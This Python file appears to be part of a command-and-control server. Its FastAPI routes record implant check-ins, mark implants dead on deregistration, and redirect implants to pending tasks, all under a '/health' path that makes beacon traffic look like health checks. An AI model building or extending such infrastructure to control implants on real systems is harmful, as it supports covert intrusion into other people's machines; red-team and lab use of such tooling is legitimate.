from datetime import datetime, timezone
from fastapi import APIRouter, FastAPI, HTTPException, status, Depends, Security
from fastapi.responses import RedirectResponse
from fastapi.security import OAuth2PasswordBearer
import re
from jose import JWTError, jwt
from typing import Optional, List

# CORRECT imports when you're inside the 'server' package
from server_helper.user_helper import Users, UserRead, UserCreate, UserDelete
from server_helper.auth_helper import oauth2_scheme, verify_token
from server_helper.db import get_db, SessionLocal

from server_helper.implant_helper import Implant, ImplantCreate, ImplantRead
from server_helper.tasking_helper import (
    Tasking,
    TaskingCreate,
    TaskingRead,
    TaskingDelete,
)

router = APIRouter(prefix="/health", tags=["health"])

# endpoint for agent to deregister itself, mark as dead (agent makes best effort to call endpoint when sudden death occurs)
@router.get("/d/{session}", response_model=ImplantCreate)
def deregister_implant(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    # implant session exists change alive to False
    db_implant.alive = False
    db_implant.last_checkin = datetime.now(timezone.utc).isoformat()
    db.commit()
    db.refresh(db_implant)
    return db_implant


# implant checkin endpoint
@router.get("/{session}", response_model=ImplantCreate)
def check_in(session: str, db: SessionLocal = Depends(get_db)):  # type: ignore
    check_in_time = datetime.now(timezone.utc).isoformat()

    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if db_implant is None:
        raise HTTPException(status_code=404, detail="Session not found")
    db_implant.last_checkin = check_in_time
    db.commit()
    db.refresh(db_implant)

    pending_tasks = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.complete == "False")
        .all()
    )

    if pending_tasks:
        # Only redirect if session is safe (alphanumeric, dash, underscore)
        if re.fullmatch(r"[A-Za-z0-9_-]+", session):
            return RedirectResponse(f"/tasks/{session}", status_code=301)
        else:
            # Reject or provide a safe fallback
            raise HTTPException(status_code=400, detail="Invalid session value")

    # no pending tasks all completed=True
    return db_implant